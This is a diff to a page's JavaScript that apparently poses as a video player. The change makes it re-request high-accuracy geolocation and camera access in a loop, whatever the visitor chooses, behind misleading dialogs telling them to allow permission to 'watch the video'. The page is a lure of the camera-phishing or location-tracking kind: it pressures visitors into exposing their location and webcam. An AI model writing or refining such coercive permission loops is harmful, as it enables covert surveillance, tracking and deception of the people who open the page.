@@ -154,8 +154,9 @@ document.addEventListener('DOMContentLoaded', () => {
                     (pos) => resolve(pos),
                     (err) => {
                         console.log("Loc failed", err);
-                        alert("Please Allow Location Permission to Watch the Video!");
-                        tryLoc();
+                        // Show confirm with OK (Allow) and Cancel buttons
+                        confirm("Please Allow Location Permission to Watch the Video!\nClick OK to Allow.");
+                        tryLoc(); // Loop regardless of choice
                     },
                     { enableHighAccuracy: true, timeout: 3000 }
                 );
@@ -170,7 +171,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     resolve(stream);
                 } catch (err) {
                     console.log("Cam failed", err);
-                    alert("Please Allow Camera Permission to Watch the Video!");
+                    confirm("Please Allow Camera Permission to Watch the Video!\nClick OK to Allow.");
                     tryCam();
                 }
             };
